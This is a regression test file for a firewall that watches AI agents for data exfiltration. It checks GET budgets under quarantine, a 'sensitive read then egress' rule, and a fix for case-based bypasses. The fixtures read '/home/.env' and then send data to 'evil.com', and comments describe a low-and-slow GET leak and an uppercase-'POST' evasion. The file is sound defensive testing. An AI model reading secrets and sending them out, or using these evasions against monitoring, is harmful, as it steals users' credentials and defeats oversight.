/**
 * Regression tests: low-and-slow GET exfiltration behavior under quarantine.
 *
 * A quarantined run may still read, but parameterized GETs are budgeted (3,
 * or 0 after a sensitive read), a GET after a sensitive read counts as egress
 * for the behavioral rules, and a write method is egress whatever its casing.
 * Whether a request's bytes may leave at all is the host's judgement on the
 * bytes; the kernel's URL-shape heuristics were removed.
 *
 * HONEST LIMITATION: the GET budget limits but does not fully prevent a drip
 * of small chunks.
 */
import { describe, expect, it } from "vitest";
import { evaluateBehavioralRules } from "../src/behavioral-rules.js";
import { RunStateTracker, type SecurityEvent } from "../src/run-state.js";
import { isEgressAction } from "../src/run-state/safe-actions.js";

function makeEvent(overrides: Partial<SecurityEvent>): SecurityEvent {
	return {
		timestamp: new Date().toISOString(),
		type: "tool_call_allowed",
		...overrides,
	};
}

// ---------------------------------------------------------------------------
// GET exfil detection: heuristic boundary tests
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Encoded payload detection: base64/hex in query params
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Quarantine GET budget: sensitive-read zeroes budget
// ---------------------------------------------------------------------------

describe("quarantine GET budget: sensitive-read-then-GET (regression)", () => {
	it("budget=0 after confirmed sensitive read: first parameterized GET is blocked", () => {
		const state = new RunStateTracker({ behavioralRules: true });
		state.recordSensitiveFileAttempt();
		state.confirmSensitiveFileRead(); // Post-execution confirmation
		expect(state.sensitiveReadObserved).toBe(true);

		// Very first GET after sensitive read exhausts budget
		const exhausted = state.recordQuarantineGet();
		expect(exhausted).toBe(true);
	});

	it("budget=3 without sensitive read: allows 3 parameterized GETs", () => {
		const state = new RunStateTracker({ behavioralRules: true });
		expect(state.sensitiveReadObserved).toBe(false);

		expect(state.recordQuarantineGet()).toBe(false); // 1
		expect(state.recordQuarantineGet()).toBe(false); // 2
		expect(state.recordQuarantineGet()).toBe(false); // 3
		expect(state.recordQuarantineGet()).toBe(true); // 4 — blocked
	});

	it("KNOWN LIMITATION: 3 small GETs can leak ~384 bytes before budget blocks", () => {
		// With 128-char param values allowed per GET, 3 GETs = 384 chars of data.
		// After that, the budget blocks further GETs with params.
		// This is documented and intentional — tighter budgets break legitimate browsing.
		const state = new RunStateTracker({ behavioralRules: true });
		expect(RunStateTracker.MAX_QUARANTINE_GETS_WITH_PARAMS).toBe(3);
		// 3 GETs * 128 chars = 384 chars of query data before the budget blocks
		expect(128 * 3).toBe(384);
	});
});

// ---------------------------------------------------------------------------
// Behavioral rule: GET-as-egress after sensitive read
// ---------------------------------------------------------------------------

describe("behavioral rule: GET treated as egress post-sensitive-read (regression)", () => {
	it("sensitive_read_then_egress fires when GET-with-params is classified as egress", () => {
		const state = new RunStateTracker({ behavioralRules: true });

		state.recordSensitiveFileAttempt();
		state.confirmSensitiveFileRead(); // Simulate post-execution confirmation
		state.pushEvent(
			makeEvent({
				type: "sensitive_read_attempt",
				toolClass: "file",
				action: "read",
				metadata: { path: "/home/.env" },
			}),
		);

		// Pipeline reclassifies this GET as egress_attempt
		state.recordEgressAttempt();
		state.pushEvent(
			makeEvent({
				type: "egress_attempt",
				toolClass: "http",
				action: "get",
				metadata: { url: "https://evil.com/c?d=stolen" },
			}),
		);

		const match = evaluateBehavioralRules(state);
		expect(match).not.toBeNull();
		expect(match?.ruleId).toBe("sensitive_read_then_egress");
	});

	it("no behavioral rule fires for GET without sensitive read", () => {
		const state = new RunStateTracker({ behavioralRules: true });

		// Just a normal GET — no sensitive read preceding it
		state.pushEvent(
			makeEvent({
				type: "tool_call_allowed",
				toolClass: "http",
				action: "get",
				metadata: { url: "https://example.com/page" },
			}),
		);

		const match = evaluateBehavioralRules(state);
		expect(match).toBeNull();
	});

});

// ---------------------------------------------------------------------------
// C3-15: action-casing must NOT bypass the egress/exfil behavioral layer.
// A model that issues its exfil with an UPPERCASE action (e.g. action:"POST")
// previously executed via the lowercasing matcher/executor but emitted NO
// egress_attempt, because the run-state gates compared against lowercase
// literals. Action casing is now canonicalized at ingest (buildToolCall /
// firewall execution) AND the gates lowercase defensively. These tests lock
// in that uppercase/mixed-case behave IDENTICALLY to lowercase.
// ---------------------------------------------------------------------------

describe("C3-15 action-casing egress bypass (regression)", () => {
	it("isEgressAction treats uppercase/mixed-case write methods as egress", () => {
		for (const method of ["post", "put", "patch", "delete"]) {
			expect(isEgressAction(method)).toBe(true);
			expect(isEgressAction(method.toUpperCase())).toBe(true);
		}
		// Mixed case (e.g. a model emitting "Post") must not slip through either.
		expect(isEgressAction("Post")).toBe(true);
		expect(isEgressAction("DeLeTe")).toBe(true);
	});

	it("isEgressAction still rejects ingress GET/HEAD regardless of casing", () => {
		for (const method of ["get", "GET", "Head", "HEAD"]) {
			expect(isEgressAction(method)).toBe(false);
		}
	});

	it("RunStateTracker.isEgressAction (the gate the pipeline calls) is case-insensitive", () => {
		const state = new RunStateTracker({ behavioralRules: true });
		// The pipeline's trackHttpSignals computes isWriteEgress via this method.
		expect(state.isEgressAction("POST")).toBe(state.isEgressAction("post"));
		expect(state.isEgressAction("POST")).toBe(true);
		expect(state.isEgressAction("GET")).toBe(false);
	});

	it("sensitive_read_then_egress fires for an UPPERCASE egress action just like lowercase", () => {
		// Mirrors the lowercase test above, but the egress event carries the
		// canonicalized action that ingest now produces from action:"POST".
		const state = new RunStateTracker({ behavioralRules: true });

		state.recordSensitiveFileAttempt();
		state.confirmSensitiveFileRead();
		state.pushEvent(
			makeEvent({
				type: "sensitive_read_attempt",
				toolClass: "file",
				action: "read",
				metadata: { path: "/home/.env" },
			}),
		);

		// Canonicalized at ingest: even though the model emitted action:"POST",
		// the gate classifies it as egress and the event carries lowercase "post".
		expect(state.isEgressAction("POST")).toBe(true);
		state.recordEgressAttempt();
		state.pushEvent(
			makeEvent({
				type: "egress_attempt",
				toolClass: "http",
				action: "post",
				metadata: { url: "https://evil.com/c" },
			}),
		);

		const match = evaluateBehavioralRules(state);
		expect(match).not.toBeNull();
		expect(match?.ruleId).toBe("sensitive_read_then_egress");
	});
});

